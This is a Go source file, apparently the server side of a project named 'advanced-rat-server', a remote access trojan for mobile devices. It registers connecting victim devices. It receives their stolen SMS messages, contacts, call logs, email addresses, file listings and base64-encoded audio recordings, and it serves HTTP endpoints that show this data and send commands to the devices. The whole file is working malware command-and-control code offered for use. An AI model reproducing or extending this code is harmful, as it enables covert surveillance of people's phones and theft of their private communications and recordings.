package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	"github.com/diptomondal007/advanced-rat-server/handlers"
	"log"
	"net/http"

	"github.com/googollee/go-socket.io"
)

//type sms struct {
//	PhoneNumber string `json:"phone-number"`
//	Message string `json:"message"`
//}
//
//type smsList struct {
//	deviceName string `json:"device_name"`
//	allSMS []sms `json:"all_sms"`
//}

var server socketio.Server

type EmailAddresses struct {
	Emails []struct {
		Email string `json:"email"`
	} `json:"emails"`
}

func main() {
	handlers.DevicesList.Devices = make([]handlers.Device,0)
	server, err := socketio.NewServer(nil)
	if err != nil {
		log.Fatal(err)
	}
	server.OnConnect("/", func(s socketio.Conn) error {
		device := handlers.Device{
			ID:                  s.ID(),
			Conn:                s,
			DeviceDetails:       s.RemoteHeader().Get("User-Agent"),
			DeviceRemoteAddress: s.RemoteAddr().String(),
		}
		handlers.DevicesList.Devices = append(handlers.DevicesList.Devices, device)
		fmt.Println("connected:", s.RemoteHeader().Get("User-Agent"))
		s.Emit("p")
		server.OnEvent("/", "p", func(s socketio.Conn, data interface{}) {
			res, _ := json.Marshal(data)
			var emailAddress EmailAddresses
			err := json.Unmarshal(res, &emailAddress)
			if err != nil {
				log.Println(err)
			}
			var d handlers.Device
			for i, v := range handlers.DevicesList.Devices {
				if v.ID == s.ID() {
					d = v
					handlers.DevicesList.Devices = handlers.DevicesList.Devices[i+1:]
					for _, e := range emailAddress.Emails {
						log.Println(e.Email)
						d.EmailAddresses = append(d.EmailAddresses, e.Email)
					}
					log.Println(v)
					v.EmailAddresses = d.EmailAddresses
				}
			}
			handlers.DevicesList.Devices = append(handlers.DevicesList.Devices, d)
		})
		return nil
	})

	server.OnEvent("/", "sms", func(c socketio.Conn, data interface{}) {
		handlers.MessageList = data
	})
	server.OnEvent("/", "contacts", func(c socketio.Conn, data interface{}) {
		handlers.ContactList = data
	})
	server.OnEvent("/", "call-logs", func(c socketio.Conn, data interface{}) {
		log.Println(data)
		handlers.CallLogs = data
	})
	server.OnEvent("/", "record", func(c socketio.Conn, data string) {
		dec, err := base64.StdEncoding.DecodeString(data)
		if err != nil {
			panic(err)
		}

		f, err := os.Create("file.mp3")
		if err != nil {
			panic(err)
		}
		defer f.Close()

		if _, err := f.Write(dec); err != nil {
			panic(err)
		}
		if err := f.Sync(); err != nil {
			panic(err)
		}
		log.Println("record received")
	})

	server.OnEvent("/", "fm-ls", func(c socketio.Conn, data interface{}) {
		handlers.FmList = data
	})

	server.OnError("/", func(s socketio.Conn, e error) {
		fmt.Println("meet error:", e)
	})
	server.OnDisconnect("/", func(s socketio.Conn, reason string) {
		for i, v := range handlers.DevicesList.Devices{
			if s.ID() == v.ID{
				handlers.DevicesList.Devices = handlers.DevicesList.Devices[i+1:]
			}
		}
		fmt.Println("disconnected ", s.ID())
		fmt.Println("closed", reason)
	})

	go server.Serve()
	defer server.Close()
	http.Handle("/", server)
	http.HandleFunc("/all", handlers.DeviceHandler)
	http.HandleFunc("/command", handlers.CommandHandler)
	http.HandleFunc("/sms/list", handlers.SmsListView)
	http.HandleFunc("/contact/list", handlers.ContactListView)
	http.HandleFunc("/call/logs", handlers.CallLogsView)
	http.HandleFunc("/fm/list", handlers.GetFileList)
	log.Println("Listening on 8000....")
	log.Fatal(http.ListenAndServe(":8000", nil))
}
